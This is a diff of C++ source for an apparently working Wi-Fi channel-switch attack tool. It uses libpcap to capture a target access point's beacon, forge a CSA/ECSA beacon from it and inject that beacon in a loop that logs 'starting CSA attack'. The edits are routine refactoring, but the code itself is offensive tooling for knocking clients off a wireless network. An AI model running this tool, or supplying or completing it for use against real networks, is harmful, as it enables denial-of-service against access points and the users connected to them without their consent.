@@ -1,13 +1,4 @@
-#include <iostream>
-#include <string>
-#include <vector>
-#include <atomic>
-#include <csignal>
-#include <stdexcept>
-
-#include <unistd.h>
-#include <pcap.h>
-
+#include "pch.h"
 #include "mac.h"
 #include "dot11.h"
 #include "frame.h"
@@ -47,16 +38,15 @@ static bool capture_first_beacon(pcap_t* pcap, const Mac& apMac, std::vector<uin
         std::cerr << "pcap_compile : " << pcap_geterr(pcap) << "\n";
         return false;
     }
-    if (pcap_setfilter(pcap, &fp) < 0) {
+    bool ok = (pcap_setfilter(pcap, &fp) == 0);
+    pcap_freecode(&fp);
+    if (!ok) {
         std::cerr << "pcap_setfilter : " << pcap_geterr(pcap) << "\n";
-        pcap_freecode(&fp);
         return false;
     }
-    pcap_freecode(&fp);
 
-    std::cout << "[*] capturing beacon frame from " << apMac.toString()
+    std::cout << "[*] capturing beacon from " << apMac.toString()
               << " ... (Ctrl+C to abort)" << std::endl;
-
     return capture_one(pcap, outBeacon);
 }
 
@@ -89,7 +79,7 @@ int main(int argc, char* argv[]) {
     }
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* pcap = pcap_open_live(ifname, 65535, 1, 500, errbuf);
+    pcap_t* pcap = pcap_open_live(ifname, 65535, 1, 1 , errbuf);
     if (!pcap) {
         std::cerr << "pcap_open_live : " << errbuf << "\n"
                   << "  -> root 권한과 monitor mode 인터페이스를 확인하세요.\n";
@@ -123,31 +113,26 @@ int main(int argc, char* argv[]) {
     }
     std::cout << "[+] captured beacon : " << beaconBuf.size() << " bytes\n";
 
-    uint8_t outFrame[2048];
-    size_t  outLen = build_csa_beacon(
-        outFrame,
-        sizeof(outFrame),
-        beaconBuf.data(),
-        beaconBuf.size(),
-        hasStation,
-        staMac
-    );
-    if (outLen == 0) {
+    std::vector<uint8_t> outFrame = build_csa_beacon(beaconBuf, hasStation, staMac);
+    if (outFrame.empty()) {
         std::cerr << "CSA frame 생성 실패 (캡처된 프레임이 잘못되었거나 너무 큽니다)\n";
         pcap_close(pcap);
         return 1;
     }
-    std::cout << "[+] built CSA/ECSA frame : " << outLen << " bytes\n"
+    std::cout << "[+] built CSA/ECSA frame : " << outFrame.size() << " bytes\n"
               << "[*] starting CSA attack ... (Ctrl+C to stop)" << std::endl;
 
-    Dot11*        macHdr     = reinterpret_cast<Dot11*>(outFrame + sizeof(Dot11RadioTap));
-    uint16_t      tx_seqCtrl = 0;
-    unsigned long sent_ok    = 0;
+    uint8_t* const dot11Ptr   = outFrame.data() + sizeof(Dot11RadioTap);
+    uint16_t       tx_seqCtrl = 0;
+    uint64_t       sent_ok    = 0;
 
     while (g_running.load()) {
-        macHdr->seqNum(tx_seqCtrl);
+        Dot11 macHdr;
+        std::memcpy(&macHdr, dot11Ptr, sizeof(Dot11));
+        macHdr.advanceSeq(tx_seqCtrl);
+        std::memcpy(dot11Ptr, &macHdr, sizeof(Dot11));
 
-        if (pcap_sendpacket(pcap, outFrame, static_cast<int>(outLen)) != 0) {
+        if (pcap_sendpacket(pcap, outFrame.data(), static_cast<int>(outFrame.size())) != 0) {
             std::cerr << "pcap_sendpacket : " << pcap_geterr(pcap) << "\n";
             break;
         }
@@ -155,7 +140,7 @@ int main(int argc, char* argv[]) {
 
         if (sent_ok % 20 == 0) {
             std::cout << "[+] CSA sent : ok=" << sent_ok
-                      << " (" << outLen << " bytes)" << std::endl;
+                      << " (" << outFrame.size() << " bytes)" << std::endl;
         }
 
         usleep(100 * 1000);
